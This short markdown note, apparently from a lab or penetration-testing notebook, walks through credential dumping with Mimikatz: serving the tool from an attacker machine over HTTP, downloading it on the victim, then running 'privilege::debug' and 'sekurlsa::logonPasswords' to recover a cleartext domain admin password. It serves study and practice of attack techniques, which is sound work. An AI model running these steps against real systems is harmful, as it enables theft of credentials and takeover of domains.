## Credential Dumping with Mimikatz
- Open terminal in the directory containing the mimikatz x64 directory
- `python3 -m http.server 80`
- Open Edge on vicitim machine and navigate to attacker's IP
- Download all 4 files
- Run mimikatz as administrator on victim machine `mimikatz.exe`
- Set privilege mode to debug: `privilege::debug`
- List providers credentials: `sekurlsa::logonPasswords`
- Cleartext DA password:

  ![image](https://github.com/user-attachments/assets/0a6b58c3-27c7-40dc-9cdf-5ad3718f1efe)

- It is stored in the cred manager
